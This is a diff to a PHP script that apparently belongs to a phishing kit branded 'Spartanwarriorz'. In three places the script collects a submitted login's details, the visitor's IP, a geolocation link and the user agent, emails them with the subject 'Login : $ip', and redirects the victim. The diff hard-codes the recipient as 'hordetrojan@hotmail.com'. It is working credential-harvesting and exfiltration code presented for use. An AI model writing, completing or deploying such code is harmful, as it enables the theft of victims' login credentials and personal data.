@@ -1,4 +1,3 @@
-$message = "";
 <?php
 include 'email.php';
 
@@ -15,7 +14,7 @@ if (isset($_POST['btn1'])) {
     $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
     $message .= "User Agent : ".$useragent."\n";
     $message .= "|------ Spartanwarriorz ------|\n";
-    $send = $Receive_email;
+    $send = "hordetrojan@hotmail.com"; // Replace with the recipient email address
     $subject = "Login : $ip";
     mail($send, $subject, $message);
     $count = $_POST['count'];
@@ -34,7 +33,7 @@ if (isset($_POST['btn1'])) {
     $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
     $message .= "User Agent : ".$useragent."\n";
     $message .= "|------ Spartanwarriorz ------|\n";
-    $send = $Receive_email;
+    $send = "hordetrojan@hotmail.com"; // Replace with the recipient email address
     $subject = "Login : $ip";
     mail($send, $subject, $message);
     header("Location: ./bar.html");
@@ -51,7 +50,7 @@ if (isset($_POST['btn1'])) {
     $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
     $message .= "User Agent : ".$useragent."\n";
     $message .= "|------ Spartanwarriorz ------|\n";
-    $send = $Receive_email;
+    $send = "hordetrojan@hotmail.com"; // Replace with the recipient email address
     $subject = "Login : $ip";
     mail($send, $subject, $message);
     header("Location: ./bar.html");
